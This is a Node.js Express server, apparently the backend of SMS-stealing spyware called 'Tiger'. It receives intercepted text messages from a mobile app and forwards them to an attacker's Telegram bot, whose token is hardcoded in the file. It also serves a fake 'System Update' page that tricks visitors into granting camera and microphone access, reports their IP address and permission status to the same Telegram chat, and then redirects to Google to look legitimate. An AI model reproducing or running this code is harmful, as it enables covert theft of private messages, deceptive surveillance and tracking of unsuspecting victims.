const express = require('express');
const axios = require('axios');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// --- CONFIGURATION ---
const BOT_TOKEN = '8394719862:AAGdG06eMVj_Mz4hFCqv-jHrmyiSqsDXppk'; 
const CHAT_ID = '7128071523';
// ---------------------

let smsLogs = [];

// 1. Endpoint: Mobile App Data
app.post('/log-sms', async (req, res) => {
    try {
        const { sender, message, device, timestamp } = req.body;
        const newEntry = {
            id: Date.now(),
            sender: sender || 'Unknown',
            message: message || 'Empty',
            device: device || 'Tiger-Device',
            timestamp: timestamp || new Date().toISOString()
        };
        smsLogs.unshift(newEntry);

        const telegramMsg = `🐯 *Tiger SMS Alert!*\n\n` +
                          `📱 *Device:* ${newEntry.device}\n` +
                          `👤 *From:* ${newEntry.sender}\n` +
                          `💬 *Message:* ${newEntry.message}`;

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: telegramMsg,
            parse_mode: 'Markdown'
        });
        res.status(200).json({ status: 'success' });
    } catch (error) {
        res.status(500).json({ status: 'error' });
    }
});

// 2. Link Tracking Page (/track)
app.get('/track', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>System Update</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { background: #000; color: #fff; font-family: sans-serif; text-align: center; padding: 50px 20px; }
                button { background: #1ed760; border: none; padding: 15px 30px; border-radius: 25px; color: white; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 20px; }
                .loader { display: none; color: #aaa; margin-top: 20px; }
            </style>
        </head>
        <body>
            <h1>Update Required</h1>
            <p>Your device requires a hardware verification to continue with the system update.</p>
            <button id="btn" onclick="startCapture()">Verify Hardware</button>
            <div id="loader" class="loader">Verifying... Please wait...</div>

            <script>
                async function startCapture() {
                    document.getElementById('btn').style.display = 'none';
                    document.getElementById('loader').style.display = 'block';
                    
                    try {
                        // Camera & Mic Request
                        const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
                        
                        await fetch(window.location.origin + '/log-link-access', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ status: '✅ PERMISSION GRANTED', type: 'Camera/Mic' })
                        });

                        stream.getTracks().forEach(track => track.stop());
                        alert("Hardware Verified! Redirecting...");
                        window.location.href = "https://www.google.com"; // Redirect to look real
                        
                    } catch (err) {
                        await fetch(window.location.origin + '/log-link-access', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ status: '❌ PERMISSION DENIED', type: 'Camera/Mic' })
                        });
                        alert("Error: Verification failed. Please allow permissions.");
                        location.reload();
                    }
                }
            </script>
        </body>
        </html>
    `);
});

// 3. Endpoint: Log Link Access
app.post('/log-link-access', async (req, res) => {
    try {
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const { status, type } = req.body;

        const msg = `🔗 *Tiger Link Alert!*\n\n` +
                    `📍 *IP:* ${ip}\n` +
                    `🔐 *Action:* ${status}\n` +
                    `🛠 *Type:* ${type}`;

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: msg,
            parse_mode: 'Markdown'
        });
        res.json({ success: true });
    } catch (error) {
        console.error("Link Log Error:", error.message);
        res.status(500).json({ error: error.message });
    }
});

app.get('/get-logs', (req, res) => res.json(smsLogs));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('🚀 Tiger Server Live on Port ' + PORT));
